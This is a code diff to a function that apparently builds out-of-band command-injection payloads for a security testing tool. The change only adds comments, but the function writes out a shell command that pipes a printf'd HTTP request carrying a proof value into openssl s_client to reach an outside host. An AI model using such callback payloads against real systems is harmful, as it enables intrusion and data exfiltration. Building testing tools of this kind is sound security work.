@@ -154,6 +154,10 @@ def _openssl_cmd(hostname, cmd=None, proof=""):
   connect = (PIPE + "openssl s_client -connect " + hostname + ":" + port +
              " -servername " + hostname + " 2>/dev/null")
   # Double quoted, so the shell works the sum out before 'printf' is handed the request line.
+  # Named here rather than asked of 'checks.print_*', which the rest of the payloads print through:
+  # what is being written is a request line, and the one thing 'echo' cannot be relied on for on
+  # every shell is the '\r\n' that ends one. Nothing else in an out-of-band payload prints at all,
+  # so this is still the only name one of them carries.
   if cmd is None:
     return "printf \"GET /" + proof + " HTTP/1.0\\r\\nHost: " + hostname + "\\r\\n\\r\\n\"" + connect
   """
